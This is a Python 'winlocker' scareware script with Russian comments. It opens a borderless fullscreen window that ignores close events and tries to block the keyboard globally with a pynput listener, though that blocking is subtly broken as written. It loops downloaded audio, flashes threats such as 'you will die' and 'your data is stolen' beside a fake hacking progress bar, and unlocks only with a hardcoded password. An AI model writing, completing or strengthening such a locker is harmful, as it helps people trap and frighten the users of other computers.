import pygame
import random
import sys
import time
import threading
import requests
import os
import tempfile
from pynput import keyboard

# === НАСТРОЙКИ ===
PASSWORD = "1601"
TEST_TIMER = 15          # секунд для теста (потом замените на 600)
MUSIC_URL = "https://www.sample-videos.com/audio/mp3/crowd-cheering.mp3"  # ЗАМЕНИТЕ НА РЕАЛЬНУЮ ПРЯМУЮ ССЫЛКУ НА MP3
# Рекомендую: залить свой трек на любой прямой хостинг (например, 
# https://github.com/ваш-аккаунт/репозиторий/raw/main/music.mp3)

# === ГЛОБАЛЬНАЯ БЛОКИРОВКА ===
block_keys = True

def on_press(key):
    return not block_keys

def on_release(key):
    return not block_keys

listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

# === ФУНКЦИЯ ДЛЯ СКАЧИВАНИЯ И ВОСПРОИЗВЕДЕНИЯ МУЗЫКИ ===
def download_and_play():
    try:
        # Временный файл (можно и в папку с программой)
        temp_path = os.path.join(tempfile.gettempdir(), "winlocker_music.mp3")
        if not os.path.exists(temp_path):
            print("Скачивание музыки...")
            r = requests.get(MUSIC_URL, stream=True, timeout=10)
            if r.status_code == 200:
                with open(temp_path, 'wb') as f:
                    for chunk in r.iter_content(1024):
                        f.write(chunk)
        if os.path.exists(temp_path):
            pygame.mixer.init()
            pygame.mixer.music.load(temp_path)
            pygame.mixer.music.play(-1)  # -1 = зациклить
    except Exception as e:
        print("Ошибка музыки:", e)
        # Альтернатива: проиграть встроенный звук
        try:
            import winsound
            winsound.Beep(1000, 500)
        except:
            pass

# === ИНИЦИАЛИЗАЦИЯ Pygame ===
pygame.init()
infoObject = pygame.display.Info()
W, H = infoObject.current_w, infoObject.current_h

screen = pygame.display.set_mode((W, H), pygame.NOFRAME)
pygame.display.set_caption("CTOS 2.0")
clock = pygame.time.Clock()

font_big = pygame.font.Font(None, 120)
font_mid = pygame.font.Font(None, 70)
font_small = pygame.font.Font(None, 40)

WHITE = (255,255,255)
BLACK = (0,0,0)
RED = (255,0,0)

scary_texts = [
    "ТЫ УМРЁШЬ",
    "СИСТЕМА ЗАБЛОКИРОВАНА",
    "НЕТ ВЫХОДА",
    "ЗА ТОБОЙ СЛЕДЯТ",
    "ТВОИ ДАННЫЕ УКРАДЕНЫ",
    "ПРОЩАЙ",
]

def draw_reaper(surf, x, y, frame):
    pygame.draw.ellipse(surf, RED, (x-30, y-60, 60, 70), 3)
    pygame.draw.polygon(surf, RED, [(x-35, y-30), (x, y-50), (x+35, y-30)], 3)
    if frame % 20 < 10:
        pygame.draw.circle(surf, RED, (x-10, y-20), 6)
        pygame.draw.circle(surf, RED, (x+10, y-20), 6)
    else:
        pygame.draw.line(surf, RED, (x-12, y-20), (x-8, y-20), 3)
        pygame.draw.line(surf, RED, (x+8, y-20), (x+12, y-20), 3)
    pygame.draw.line(surf, RED, (x, y), (x, y+80), 3)
    angle = frame * 0.05
    end_x = x + int(60 * pygame.math.Vector2(1,0).rotate(angle)[0])
    end_y = y + int(60 * pygame.math.Vector2(1,0).rotate(angle)[1])
    pygame.draw.line(surf, RED, (x, y-30), (end_x, end_y), 3)

def draw_fake_hack(surf, percent):
    text = font_mid.render(f"Взлом ctOS 2.0: {percent}%", True, RED)
    surf.blit(text, (50,50))
    bar_width = int((percent/100)*(W-200))
    pygame.draw.rect(surf, RED, (50,120, bar_width,30), 3)
    for i in range(0, bar_width, 15):
        pygame.draw.rect(surf, RED, (55+i,125,10,20))

def draw_scary_text(surf, frame):
    text = scary_texts[frame % len(scary_texts)]
    txt = font_big.render(text, True, RED)
    surf.blit(txt, (W//2 - txt.get_width()//2, H//2 + 200))

# === ЗАПУСК МУЗЫКИ (в потоке, чтобы не зависать) ===
threading.Thread(target=download_and_play, daemon=True).start()

# === ТАЙМЕР ОЖИДАНИЯ ===
start_time = time.time()
while time.time() - start_time < TEST_TIMER:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pass
    screen.fill(BLACK)
    elapsed = time.time() - start_time
    percent = min(100, int((elapsed / TEST_TIMER) * 100))
    draw_fake_hack(screen, percent)
    draw_reaper(screen, 100, H//2, int(elapsed*10))
    draw_reaper(screen, W-100, H//2, int(elapsed*10+5))
    draw_scary_text(screen, int(elapsed*2))
    for _ in range(100):
        x = random.randint(0,W)
        y = random.randint(0,H)
        pygame.draw.circle(screen, RED, (x,y), 3)
    pygame.display.flip()
    clock.tick(30)

# === ОКНО БЛОКИРОВКИ С ПАРОЛЕМ ===
input_box = pygame.Rect(W//2-150, H//2+100, 300, 50)
text_input = ""

while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pass
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_RETURN:
                if text_input == PASSWORD:
                    pygame.mixer.music.stop()  # остановить музыку при разблокировке
                    pygame.quit()
                    sys.exit()
                else:
                    text_input = ""
            elif event.key == pygame.K_BACKSPACE:
                text_input = text_input[:-1]
            elif event.unicode.isprintable():
                text_input += event.unicode

    screen.fill(BLACK)
    draw_reaper(screen, W//2, H//2 - 150, int(time.time()*15)%30)
    draw_scary_text(screen, int(time.time()*2)%len(scary_texts))
    prompt = font_mid.render("Введите пароль:", True, RED)
    screen.blit(prompt, (W//2-200, H//2))
    pygame.draw.rect(screen, RED, input_box, 3)
    txt_surf = font_small.render(text_input, True, RED)
    screen.blit(txt_surf, (input_box.x+10, input_box.y+10))
    pygame.display.flip()
    clock.tick(30)
